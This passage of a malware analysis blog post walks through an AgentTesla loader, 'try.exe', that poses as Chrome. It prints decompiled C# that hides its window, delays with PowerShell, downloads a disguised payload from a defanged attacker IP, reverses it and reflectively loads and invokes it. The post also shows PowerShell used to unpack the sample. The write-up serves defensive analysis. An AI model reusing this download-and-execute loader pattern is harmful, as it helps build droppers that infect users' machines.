<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyTrademark</span><span class="p">(</span><span class="s">""</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">ComVisible</span><span class="p">(</span><span class="k">false</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">Guid</span><span class="p">(</span><span class="s">"9ed52309-a8ba-46e5-8d13-1d18443695a0"</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyFileVersion</span><span class="p">(</span><span class="s">"100.0.4869.0"</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">TargetFramework</span><span class="p">(</span><span class="s">".NETFramework,Version=v4.6"</span><span class="p">,</span> <span class="n">FrameworkDisplayName</span> <span class="p">=</span> <span class="s">".NET Framework 4.6"</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyVersion</span><span class="p">(</span><span class="s">"100.0.4869.0"</span><span class="p">)]</span>
</pre></table></code></div></div><p>Immediately in the assembly properties we can tell the adversary is trying to masquerade as Google Chrome. They’re trying to pose as Chrome v100. Another good data point is the GUID value in the assembly properties. If you have VirusTotal Enterprise/Intelligence you can plug that GUID into a search using <code class="language-plaintext highlighter-rouge">netguid:</code> and pivot to find similar .NET binaries. Alright, since this is a .NET EXE and not a DLL, let’s try to find the entry point. It should be the function Main().</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="k">private</span> <span class="k">static</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">_buffer</span><span class="p">;</span>

<span class="k">private</span> <span class="k">static</span> <span class="n">Assembly</span> <span class="n">_assembly</span><span class="p">;</span>

<span class="p">[</span><span class="n">STAThread</span><span class="p">]</span>
<span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">Native</span><span class="p">.</span><span class="nf">ShowWindow</span><span class="p">(</span><span class="n">Process</span><span class="p">.</span><span class="nf">GetCurrentProcess</span><span class="p">().</span><span class="nf">get_MainWindowHandle</span><span class="p">(),</span> <span class="m">0</span><span class="p">);</span>
    <span class="nf">Read</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="nf">BufferLength</span><span class="p">()</span> <span class="p">&gt;</span> <span class="m">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nf">Mix</span><span class="p">()</span> <span class="p">&gt;</span> <span class="p">-</span><span class="m">1</span> <span class="p">&amp;&amp;</span> <span class="nf">ACMP</span><span class="p">()</span> <span class="p">&gt;</span> <span class="p">-</span><span class="m">1</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"Done"</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">throw</span> <span class="k">new</span> <span class="nf">Exception</span><span class="p">();</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Sure enough, we have a Main function that IS NOT OBFUSCATED! This calls for a drink. Anyways, it looks like Main calls 4 functions defined in the code:</p><ul><li>Read()<li>BufferLength()<li>Mix()<li>ACMP()</ul><p>Let’s take a look at Read() first.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="k">private</span> <span class="k">static</span> <span class="kt">bool</span> <span class="nf">Read</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">try</span>
    <span class="p">{</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="m">5</span><span class="p">;</span> <span class="n">i</span><span class="p">++)</span>
        <span class="p">{</span>
            <span class="n">ProcessStartInfo</span> <span class="n">val</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">ProcessStartInfo</span><span class="p">();</span>
            <span class="n">val</span><span class="p">.</span><span class="nf">set_FileName</span><span class="p">(</span><span class="s">"powershell"</span><span class="p">);</span>
            <span class="n">val</span><span class="p">.</span><span class="nf">set_Arguments</span><span class="p">(</span><span class="s">"Test-Connection 127.0.0.1"</span><span class="p">);</span>
            <span class="n">val</span><span class="p">.</span><span class="nf">set_CreateNoWindow</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
            <span class="n">val</span><span class="p">.</span><span class="nf">set_WindowStyle</span><span class="p">((</span><span class="n">ProcessWindowStyle</span><span class="p">)</span><span class="m">1</span><span class="p">);</span>
            <span class="n">Process</span><span class="p">.</span><span class="nf">Start</span><span class="p">(</span><span class="n">val</span><span class="p">).</span><span class="nf">WaitForExit</span><span class="p">();</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">catch</span>
    <span class="p">{</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>The Read() function looks like it pieces together a PowerShell connection using a ProcessStartInfo object and executes it with Process.Start, waiting for the process to finish. Once the command gets build and run, it’ll execute <code class="language-plaintext highlighter-rouge">powershell.exe Test-Connection 127.0.0.1</code>. The <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/test-connection?view=powershell-7.2">Test-Connection</a> cmdlet in PowerShell is similar to a <code class="language-plaintext highlighter-rouge">ping</code> command. When I see this activity in the wild it’s usually either a connectivity test or a method to impose a time delay. Once this time delay finishes, the method returns and moves to BufferLength().</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="k">private</span> <span class="k">static</span> <span class="kt">long</span> <span class="nf">BufferLength</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">_buffer</span> <span class="p">=</span> <span class="p">((</span><span class="n">Task</span><span class="p">&lt;</span><span class="kt">byte</span><span class="p">[</span><span class="k">]&gt;</span><span class="p">)</span><span class="k">typeof</span><span class="p">(</span><span class="n">HttpClient</span><span class="p">).</span><span class="nf">GetMethod</span><span class="p">(</span><span class="s">"SrdsGetBySrdsteArrSrdsayAsySrdsnc"</span><span class="p">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s">"Srds"</span><span class="p">,</span> <span class="s">""</span><span class="p">),</span> <span class="k">new</span> <span class="n">Type</span><span class="p">[</span><span class="m">1</span><span class="p">]</span>
    <span class="p">{</span>
        <span class="k">typeof</span><span class="p">(</span><span class="kt">string</span><span class="p">)</span>
    <span class="p">})!.</span><span class="nf">Invoke</span><span class="p">(</span><span class="k">new</span> <span class="nf">HttpClient</span><span class="p">(),</span> <span class="k">new</span> <span class="kt">object</span><span class="p">[</span><span class="m">1</span><span class="p">]</span>
    <span class="p">{</span>
        <span class="s">"hxxp://185.222.58[.]56/try.png"</span>
    <span class="p">})).</span><span class="n">Result</span><span class="p">;</span>
    <span class="k">return</span> <span class="n">_buffer</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>So the BufferLength() function downloads content into a byte array in a rather verbose way. It searches the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.http.httpclient?view=net-6.0">HttpClient</a> .NET class for the method <a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.http.httpclient.getbytearrayasync?view=net-6.0">GetByteArrayAsync()</a> and then invokes it with a URL argument. The result gets saved into <code class="language-plaintext highlighter-rouge">_buffer</code>, a byte array variable, and the function returns the length of this variable. The return value gets used in a <code class="language-plaintext highlighter-rouge">BufferLength() &gt; 0</code> check to make sure some content downloaded before proceeding. Now let’s look at the Mix() function.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="k">private</span> <span class="k">static</span> <span class="kt">long</span> <span class="nf">Mix</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">Array</span><span class="p">.</span><span class="nf">Reverse</span><span class="p">((</span><span class="n">Array</span><span class="p">)</span><span class="n">_buffer</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">_buffer</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
    <span class="n">_assembly</span> <span class="p">=</span> <span class="n">Assembly</span><span class="p">.</span><span class="nf">Load</span><span class="p">(</span><span class="n">_buffer</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">_assembly</span><span class="p">.</span><span class="n">HostContext</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>The Mix() function takes the <code class="language-plaintext highlighter-rouge">_buffer</code> variable, reverses its contents, and reflectively loads the reversed contents into a <code class="language-plaintext highlighter-rouge">_assembly</code> variable. At this point we can be pretty certain that <code class="language-plaintext highlighter-rouge">_buffer</code> contains a .NET assembly inside its byte array and that assembly is loaded into memory. From here, we can assume there will be some kind of Invoke method occurring in ACMP().</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="k">private</span> <span class="k">static</span> <span class="kt">long</span> <span class="nf">ACMP</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">Type</span><span class="p">[]</span> <span class="n">exportedTypes</span> <span class="p">=</span> <span class="n">_assembly</span><span class="p">.</span><span class="nf">GetExportedTypes</span><span class="p">();</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="n">Type</span> <span class="n">type</span> <span class="k">in</span> <span class="n">exportedTypes</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">MethodInfo</span><span class="p">[]</span> <span class="n">methods</span> <span class="p">=</span> <span class="n">type</span><span class="p">.</span><span class="nf">GetMethods</span><span class="p">();</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="n">MethodInfo</span> <span class="n">methodInfo</span> <span class="k">in</span> <span class="n">methods</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">methodInfo</span><span class="p">.</span><span class="n">Name</span> <span class="p">==</span> <span class="s">"Qddywbxavgtbjaukcldrpmcm"</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="k">return</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">methodInfo</span><span class="p">.</span><span class="nf">Invoke</span><span class="p">(</span><span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="m">0L</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>The ACMP() function enumerates the methods in the assembly that was just reflectively loaded in <code class="language-plaintext highlighter-rouge">_assembly</code>, looking for a method named <code class="language-plaintext highlighter-rouge">Qddywbxavgtbjaukcldrpmcm()</code>. Once found, it invokes the method.</p><p>Thus ends the story of <code class="language-plaintext highlighter-rouge">try.exe</code>, now it’s time to analyze <code class="language-plaintext highlighter-rouge">try.png</code> that was downloaded.</p><h2 id="analyzing-the-trypng-file"><span class="mr-2">Analyzing the Try.PNG File</span><a href="#analyzing-the-trypng-file" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Remembering back to the Mix() function, the bytes of <code class="language-plaintext highlighter-rouge">try.png</code> are reversed before they get loaded as a .NET assembly. First, we need to make sure the file we have is a reversed EXE or DLL.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/tesla-rtf$</span><span class="w"> </span>xxd <span class="nt">-C</span> try.png | <span class="nb">head</span>
<span class="go">00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000090: 0000 0000 0000 0000 0000 0000 0000 0000  ................

</span><span class="gp">remnux@remnux:~/cases/tesla-rtf$</span><span class="w"> </span>xxd <span class="nt">-C</span> try.png | <span class="nb">tail</span>
<span class="gp">00082b60: 0008 2400 0006 010b 210e 00e0 0000 0000  ..$</span>.....!.......
<span class="go">00082b70: 0000 0000 61fd 4946 0003 014c 0000 4550  ....a.IF...L..EP
</span><span class="gp">00082b80: 0000 0000 0000 0024 0a0d 0d2e 6564 6f6d  .......$</span>....edom
<span class="go">00082b90: 2053 4f44 206e 6920 6e75 7220 6562 2074   SOD ni nur eb t
00082ba0: 6f6e 6e61 6320 6d61 7267 6f72 7020 7369  onnac margorp si
00082bb0: 6854 21cd 4c01 b821 cd09 b400 0eba 1f0e  hT!.L..!........
00082bc0: 0000 0080 0000 0000 0000 0000 0000 0000  ................
00082bd0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00082be0: 0000 0000 0000 0040 0000 0000 0000 00b8  .......@........
00082bf0: 0000 ffff 0000 0004 0000 0003 0090 5a4d  ..............ZM
</span></pre></table></code></div></div><p>Sure enough, the end of <code class="language-plaintext highlighter-rouge">try.png</code> looks like it ends with a reversed <code class="language-plaintext highlighter-rouge">MZ</code> and has a reversed DOS stub. We can easily reverse these bytes using a bit of PowerShell code.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="n">Byte</span><span class="p">[]]</span><span class="w"> </span><span class="nv">$contents</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Content</span><span class="w"> </span><span class="nt">-AsByteStream</span><span class="w"> </span><span class="o">.</span><span class="nx">/try.png</span><span class="w"> 
</span><span class="p">[</span><span class="n">Array</span><span class="p">]::</span><span class="n">Reverse</span><span class="p">(</span><span class="nv">$contents</span><span class="p">)</span><span class="w">
</span><span class="n">Set-Content</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="o">.</span><span class="nx">/reversed_try.png</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nv">$contents</span><span class="w"> </span><span class="nt">-AsByteStream</span><span class="w">
</span></pre></table></code></div></div><p>Now we have a .NET DLL in <code class="language-plaintext highlighter-rouge">reversed_try.png</code>!</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/tesla-rtf$</span><span class="w"> </span>diec reversed_try.png 
<span class="go">filetype: PE32
arch: I386
mode: 32-bit
endianess: LE
type: DLL
  library: .NET(v4.0.30319)[-]
  linker: Microsoft Linker(6.0)[DLL32]
</span></pre></table></code></div></div><p>Just like before with <code class="language-plaintext highlighter-rouge">try.exe</code> we can give this a shot at decompiling, but in this case there is a lot of obfuscation.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/tesla-rtf$</span><span class="w"> </span>ilspycmd reversed_try.png <span class="o">&gt;</span> reversed_try.decompiled.cs
<span class="go">
</span><span class="gp">remnux@remnux:~/cases/tesla-rtf$</span><span class="w"> </span><span class="nb">head </span>reversed_try.decompiled.cs 
<span class="gp">using System;</span><span class="w">
</span><span class="gp">using System.CodeDom.Compiler;</span><span class="w">
</span><span class="gp">using System.Collections;</span><span class="w">
</span><span class="gp">using System.Collections.Concurrent;</span><span class="w">
</span><span class="gp">using System.Collections.Generic;</span><span class="w">
</span><span class="gp">using System.Diagnostics;</span><span class="w">
</span><span class="gp">using System.Drawing;</span><span class="w">
</span><span class="gp">using System.Globalization;</span><span class="w">
</span><span class="gp">using System.IO;</span><span class="w">
</span><span class="gp">using System.Reflection;</span><span class="w">
</span></pre></table></code></div></div><p>We have some valid C# code, so let’s take a look and see how heavy the obfuscation is. Immediately we can see that the obfuscation is beyond just some string scrambling and gets into Unicode madness.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="k">internal</span> <span class="k">class</span> <span class="err">&lt;</span><span class="nc">Module</span><span class="p">&gt;</span>
<span class="p">{</span>
    <span class="k">static</span> <span class="p">&lt;</span><span class="n">Module</span><span class="p">&gt;()</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="kt">uint</span><span class="p">.</span><span class="n">MaxValue</span> <span class="p">!=</span> <span class="m">0</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="err">\</span><span class="n">u0005</span><span class="err">\</span><span class="n">u2009</span><span class="err">\</span><span class="n">u2000</span><span class="p">.</span><span class="err">\</span><span class="nf">u0002</span><span class="p">();</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="m">7u</span> <span class="p">!=</span> <span class="m">0</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="nf">f0659e5905454a5e99b9752afc78b700</span><span class="p">();</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="err">\</span><span class="n">u0008</span><span class="err">\</span><span class="n">u2002</span><span class="err">\</span><span class="n">u2000</span><span class="p">.</span><span class="err">\</span><span class="nf">u0002</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">f0659e5905454a5e99b9752afc78b700</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="m">4u</span> <span class="p">!=</span> <span class="m">0</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="err">\</span><span class="n">u0008</span><span class="err">\</span><span class="n">u2009</span><span class="err">\</span><span class="n">u2000</span><span class="p">.</span><span class="err">\</span><span class="nf">u0002</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>This is a level of obfuscation that tends to keep me up a little too late at night, so I’m going to cut analysis short here but mention another little part of this binary: .NET resources.</p><h2 id="extracting-net-resources"><span class="mr-2">Extracting .NET Resources</span><a href="#extracting-net-resources" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>It’s really common for adversaries to hide executable content within Windows PE resources. The same is true of .NET assemblies, but assemblies have resources stored in a different way than traditional PE resources. AgentTesla has done this in the past and it seems like the same is occurring here:</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="n">Stream</span><span class="p">?</span> <span class="n">manifestResourceStream</span> <span class="p">=</span> <span class="k">typeof</span><span class="p">(</span><span class="err">\</span><span class="n">u0002</span><span class="err">\</span><span class="n">u200a</span><span class="err">\</span><span class="n">u2000</span><span class="p">).</span><span class="n">Assembly</span><span class="p">.</span><span class="nf">GetManifestResourceStream</span><span class="p">(</span><span class="s">"289e8a8929dc4fc2616eefa4e3831722"</span><span class="p">);</span>
<span class="kt">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">128</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="m">8u</span> <span class="p">!=</span> <span class="m">0</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">RuntimeHelpers</span><span class="p">.</span><span class="nf">InitializeArray</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="p">(</span><span class="n">RuntimeFieldHandle</span><span class="p">)</span><span class="cm">/*OpCode not supported: LdMemberToken*/</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">Stream</span> <span class="n">stream</span> <span class="p">=</span> <span class="err">\</span><span class="n">u0008</span><span class="err">\</span><span class="n">u2006</span><span class="p">.</span><span class="err">\</span><span class="nf">u0002</span><span class="p">(</span><span class="n">manifestResourceStream</span><span class="p">,</span> <span class="n">array</span><span class="p">,</span> <span class="err">\</span><span class="nf">u0002</span><span class="p">());</span>
<span class="k">if</span> <span class="p">(</span><span class="m">4u</span> <span class="p">!=</span> <span class="m">0</span><span class="p">)</span>
<span class="p">{</span>
    <span class="err">\</span><span class="n">u0005</span><span class="err">\</span><span class="n">u200a</span><span class="err">\</span><span class="n">u2000</span> <span class="p">=</span> <span class="n">stream</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>In the obfuscated .NET DLL it looks like the code is retrieving additional content from a .NET resource in the binary named <code class="language-plaintext highlighter-rouge">289e8a8929dc4fc2616eefa4e3831722</code> and working with it. During analysis I used this PowerShell code to extract the resource, but you can also use ILSpy or DNSpy.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nv">$teslaAssembly</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Reflection.Assembly</span><span class="p">]::</span><span class="n">LoadFile</span><span class="p">(</span><span class="s1">'/home/remnux/cases/tesla-rtf/reversed_try.png'</span><span class="p">)</span><span class="w">
</span><span class="nv">$teslaManifestName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$teslaAssembly</span><span class="o">.</span><span class="nf">GetManifestResourceNames</span><span class="p">()</span><span class="w">
</span><span class="nv">$teslaResourceStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$teslaAssembly</span><span class="o">.</span><span class="nf">GetManifestResourceStream</span><span class="p">(</span><span class="s1">'289e8a8929dc4fc2616eefa4e3831722'</span><span class="p">)</span><span class="w">
</span><span class="nv">$resourceContents</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">byte</span><span class="p">[]]::</span><span class="n">new</span><span class="p">([</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">ToInt32</span><span class="p">(</span><span class="nv">$teslaResourceStream</span><span class="o">.</span><span class="nf">length</span><span class="p">))</span><span class="w">
</span><span class="nv">$teslaResourceStream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$resourceContents</span><span class="p">,</span><span class="nx">0</span><span class="p">,[</span><span class="n">System.Convert</span><span class="p">]::</span><span class="nx">ToInt32</span><span class="p">(</span><span class="nv">$teslaResourceStream</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w">
</span><span class="n">Set-Content</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">289e8a8929dc4fc2616eefa4e3831722</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nv">$resourceContents</span><span class="w"> </span><span class="nt">-AsByteStream</span><span class="w">
</span></pre></table></code></div></div><p>The contents of <code class="language-plaintext highlighter-rouge">289e8a8929dc4fc2616eefa4e3831722</code> are presumably XOR’d but I haven’t fully run that to ground yet.</p><h2 id="adversary-decisions"><span class="mr-2">Adversary Decisions</span><a href="#adversary-decisions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>I want to close out the post by pointing out a design decision in this threat that interests me a bit. The adversary used <code class="language-plaintext highlighter-rouge">try.exe</code>, compiled .NET code, to download and execute an additional .NET DLL. Several other threats in the wild also use this technique such as Yellow Cockatoo/Jupyter and GootLoader. It’s a relatively simple endeavor to write Invoke-WebRequest commands in PowerShell and call <code class="language-plaintext highlighter-rouge">[System.Reflection.Assembly]::Load</code> to load a byte array into memory. The adversary here decided to make this download via a non-obfuscated binary, making analysis really simple. They also ran the risk of application allowlisting running on the host. If allowlisting was present, they’d fail their objective and need to use PowerShell instead. However, doing so with PowerShell also opens up the adversary to risk by allowing PowerShell log analysis. All of these decisions have advantages and disadvantages.</p><p>Thanks for reading and have a good week!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/malware/'>malware</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a> <a href="/tags/net/" class="post-tag no-text-decoration" >.net</a> <a href="/tags/agenttesla/" class="post-tag no-text-decoration" >agenttesla</a> <a href="/tags/rtf/" class="post-tag no-text-decoration" >rtf</a> <a href="/tags/equationeditor/" class="post-tag no-text-decoration" >equationeditor</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=AgentTesla From RTF Exploitation to .NET Tradecraft - Tony Lambert&amp;url=https://forensicitguy.github.io/agenttesla-rtf-dotnet-tradecraft/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=AgentTesla From RTF Exploitation to .NET Tradecraft - Tony Lambert&amp;u=https://forensicitguy.github.io/agenttesla-rtf-dotnet-tradecraft/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://forensicitguy.github.io/agenttesla-rtf-dotnet-tradecraft/&amp;text=AgentTesla From RTF Exploitation to .NET Tradecraft - Tony Lambert" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://forensicitguy.github.io/agenttesla-rtf-dotnet-tradecraft/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a 